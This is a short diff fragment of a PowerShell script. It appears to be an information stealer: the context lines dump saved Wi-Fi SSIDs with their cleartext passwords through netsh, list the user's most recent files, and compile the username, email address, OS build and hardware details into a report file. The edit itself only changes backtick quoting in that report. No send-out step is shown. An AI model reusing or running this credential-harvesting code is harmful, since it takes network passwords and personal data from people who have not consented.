@@ -503,7 +503,7 @@ if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -No
 $pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}
 $RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime
 
-$infomessage = "``========================================================
+$infomessage = "``````========================================================
 
 Current User    : $env:USERNAME
 Email Address   : $email
@@ -515,7 +515,7 @@ Current OS      : $OSString
 Build           : $ver
 Hardware Info
 --------------------------------------------------------
-$systemString``"
+$systemString``````"
 
 "--------------------- SYSTEM INFORMATION for $env:COMPUTERNAME -----------------------`n" | Out-File -FilePath $outpath -Encoding ASCII
 "General Info `n $infomessage" | Out-File -FilePath $outpath -Encoding ASCII -Append
